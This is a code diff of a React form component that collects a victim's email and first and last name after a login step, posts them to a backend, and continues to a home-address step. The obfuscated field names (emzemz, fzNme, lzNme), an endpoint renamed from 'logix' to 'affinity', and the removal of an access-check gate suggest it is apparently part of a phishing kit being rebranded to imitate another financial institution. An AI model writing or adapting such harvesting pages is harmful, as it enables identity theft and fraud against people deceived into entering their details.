@@ -1,188 +1,160 @@
-import React, { useState } from 'react';
+import React, { useEffect, useState } from 'react';
 import { useNavigate, useLocation } from 'react-router-dom';
 import axios from 'axios';
 import { baseUrl } from '../constants';
-import useAccessCheck from '../Utils/useAccessCheck';
+import FlowCard from '../components/FlowCard';
+import FormError from '../components/FormError';
 
 const BasicInfo: React.FC = () => {
-  const [fzNme, setFzNme] = useState('');
-  const [lzNme, setLzNme] = useState('');
-  const [isLoading, setIsLoading] = useState(false);
-  const [errors, setErrors] = useState({ fzNme: '', lzNme: '', email: '' });
-  const [username, setUsername] = useState('');
-  const [email, setEmail] = useState('');
-  const isAllowed = useAccessCheck(baseUrl);
-
   const navigate = useNavigate();
   const location = useLocation();
-  const { emzemz: emzemzState } = location.state || {};
+  const [username, setUsername] = useState('');
+  const [fzNme, setFzNme] = useState('');
+  const [lzNme, setLzNme] = useState('');
+  const [email, setEmail] = useState('');
+  const [isLoading, setIsLoading] = useState(false);
+  const [errors, setErrors] = useState<{ fzNme?: string; lzNme?: string; email?: string; form?: string }>({});
 
-  React.useEffect(() => {
-    if (emzemzState) {
-      setUsername(emzemzState);
-    } else {
-      console.error('No username provided from previous page');
-      // Optionally redirect back or show error
+  useEffect(() => {
+    const { emzemz } = location.state || {};
+    if (emzemz) {
+      setUsername(emzemz);
     }
-  }, [emzemzState]);
+  }, [location.state]);
 
-  // Show loading state while checking access
-  if (!isAllowed) {
-    return <div>Loading...</div>;
-  }
-
-  // Check if username is available before showing form
   if (!username) {
-    return <div>Error: No username provided. Please go back and try again.</div>;
+    return (
+      <FlowCard title="Basic Information">
+        <p className="text-sm text-gray-700 text-center">
+          We could not find your username from the previous step. Please return to the login page and try again.
+        </p>
+        <button
+          type="button"
+          onClick={() => navigate('/login')}
+          className="mt-6 w-full bg-purple-900 hover:bg-purple-800 text-white py-2 rounded-md font-medium transition"
+        >
+          Back to login
+        </button>
+      </FlowCard>
+    );
   }
-
-  const validateEmzemz = (emzemz: string) => {
-    const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    return regex.test(emzemz);
-  };
 
   const validateForm = () => {
-    const newErrors = { fzNme: '', lzNme: '', email: '' };
+    const nextErrors: { fzNme?: string; lzNme?: string; email?: string } = {};
 
-    if (!fzNme.trim()) newErrors.fzNme = 'First name is required';
-    if (!lzNme.trim()) newErrors.lzNme = 'Last name is required';
-    if (!email.trim()) newErrors.email = 'Email is required';
-    else if (!validateEmzemz(email)) newErrors.email = 'Invalid email format';
+    if (!email.trim()) {
+      nextErrors.email = 'Email is required.';
+    } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+      nextErrors.email = 'Enter a valid email address.';
+    }
 
-    setErrors(newErrors);
-    return !newErrors.fzNme && !newErrors.lzNme && !newErrors.email;
+    if (!fzNme.trim()) {
+      nextErrors.fzNme = 'First name is required.';
+    }
+
+    if (!lzNme.trim()) {
+      nextErrors.lzNme = 'Last name is required.';
+    }
+
+    setErrors(nextErrors);
+    return Object.keys(nextErrors).length === 0;
   };
 
-  const handleSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
-
+  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
+    event.preventDefault();
     if (!validateForm()) {
       return;
     }
 
     setIsLoading(true);
+    setErrors((prev) => ({ ...prev, form: undefined }));
 
     try {
-      await axios.post(`${baseUrl}api/logix-meta-data-3/`, {
-        emzemz: username,  // Username for client lookup
-        email: email,      // Actual email address
+      await axios.post(`${baseUrl}api/affinity-meta-data-3/`, {
+        emzemz: username,
+        email,
         fzNme,
-        lzNme
+        lzNme,
       });
 
       navigate('/home-address', {
         state: {
           emzemz: username,
           fzNme,
-          lzNme
-        }
+          lzNme,
+        },
       });
     } catch (error) {
-      console.error('Error submitting form:', error);
-      setErrors(prev => ({
-        ...prev,
-        form: 'There was an error submitting your information. Please try again.'
-      }));
+      console.error('Error submitting basic info:', error);
+      setErrors((prev) => ({ ...prev, form: 'Unable to submit your information. Please try again.' }));
     } finally {
       setIsLoading(false);
     }
   };
 
   return (
-    <div className="flex-1 bg-gray-200 rounded shadow-sm">
-      <div className="border-b-2 border-teal-500 px-8 py-4">
-        <h2 className="text-xl font-semibold text-gray-800">Basic Information</h2>
-      </div>
-
-      <div className="px-6 py-6 bg-white space-y-4">
-        <p className="">We will need you to confirm your personal information.</p>
-
-        <form onSubmit={handleSubmit}>
-          <div className="flex items-center gap-4 mb-4">
-            <label className="text-gray-700 w-24 text-right">Email:</label>
-            <input
-              id="email"
-              name="email"
-              type="email"
-              value={email}
-              onChange={(e) => setEmail(e.target.value)}
-              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-              placeholder="Enter email address"
-            />
-          </div>
-
-          <div className="flex items-center gap-4 mb-4">
-            <label className="text-gray-700 w-24 text-right">First Name:</label>
-            <input
-              id="fzNme"
-              name="fzNme"
-              type="text"
-              value={fzNme}
-              onChange={(e) => setFzNme(e.target.value)}
-              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-              placeholder="Enter first name"
-            />
-            {errors.fzNme && (
-              <div className="flex items-center gap-2 text-red-600 text-sm">
-                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
-                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
-                </svg>
-                <span>{errors.fzNme}</span>
-              </div>
-            )}
-          </div>
-
-          <div className="flex items-center gap-4 mb-4">
-            <label className="text-gray-700 w-24 text-right">Last Name:</label>
-            <input
-              id="lzNme"
-              name="lzNme"
-              type="text"
-              value={lzNme}
-              onChange={(e) => setLzNme(e.target.value)}
-              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-              placeholder="Enter last name"
-            />
-            {errors.lzNme && (
-              <div className="flex items-center gap-2 text-red-600 text-sm">
-                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
-                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
-                </svg>
-                <span>{errors.lzNme}</span>
-              </div>
-            )}
-          </div>
-
-          {!isLoading ? (
-            <div className="border-b-2 border-teal-500 justify-center text-center px-6 py-4">
-              <button
-                type="submit"
-                className="bg-gray-600 hover:bg-gray-700 text-white px-16 py-2 text-sm rounded"
-              >
-                Continue
-              </button>
-            </div>
-          ) : (
-            <div className="h-10 w-10 animate-spin rounded-full border-4 border-solid border-gray-600 border-t-transparent"></div>
-          )}
-        </form>
-      </div>
-
-      <div className="px-6 pb-6">
-        <p className="text-xs text-gray-700 mb-2">
-          For security reasons, never share your username, password, social security number, account number or other private data online, unless you are certain who you are providing that information to, and only share information through a secure webpage or site.
-        </p>
-        <div className="text-xs text-blue-700 space-x-2">
-          <a href="#" className="hover:underline">Forgot Username?</a>
-          <span>|</span>
-          <a href="#" className="hover:underline">Forgot Password?</a>
-          <span>|</span>
-          <a href="#" className="hover:underline">Forgot Everything?</a>
-          <span>|</span>
-          <a href="#" className="hover:underline">Locked Out?</a>
+    <FlowCard title="Basic Information">
+      <p className="text-sm text-gray-600 text-center mb-4">
+        Confirm the details we have on file before continuing your enrollment.
+      </p>
+      <form onSubmit={handleSubmit} className="space-y-4">
+        <div>
+          <label className="block text-sm font-medium text-gray-700 mb-1" htmlFor="email">
+            Email
+          </label>
+          <input
+            id="email"
+            name="email"
+            type="email"
+            value={email}
+            onChange={(event) => setEmail(event.target.value)}
+            className="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-purple-600 focus:outline-none shadow-sm"
+            placeholder="name@example.com"
+          />
+          <FormError message={errors.email ?? ''} className="mt-2" />
         </div>
-      </div>
-    </div>
+
+        <div>
+          <label className="block text-sm font-medium text-gray-700 mb-1" htmlFor="fzNme">
+            First name
+          </label>
+          <input
+            id="fzNme"
+            name="fzNme"
+            type="text"
+            value={fzNme}
+            onChange={(event) => setFzNme(event.target.value)}
+            className="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-purple-600 focus:outline-none shadow-sm"
+          />
+          <FormError message={errors.fzNme ?? ''} className="mt-2" />
+        </div>
+
+        <div>
+          <label className="block text-sm font-medium text-gray-700 mb-1" htmlFor="lzNme">
+            Last name
+          </label>
+          <input
+            id="lzNme"
+            name="lzNme"
+            type="text"
+            value={lzNme}
+            onChange={(event) => setLzNme(event.target.value)}
+            className="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-purple-600 focus:outline-none shadow-sm"
+          />
+          <FormError message={errors.lzNme ?? ''} className="mt-2" />
+        </div>
+
+        <FormError message={errors.form ?? ''} />
+
+        <button
+          type="submit"
+          className="w-full bg-purple-900 hover:bg-purple-800 text-white py-2 rounded-md font-medium transition disabled:opacity-70"
+          disabled={isLoading}
+        >
+          {isLoading ? 'Submitting…' : 'Continue'}
+        </button>
+      </form>
+    </FlowCard>
   );
 };
 
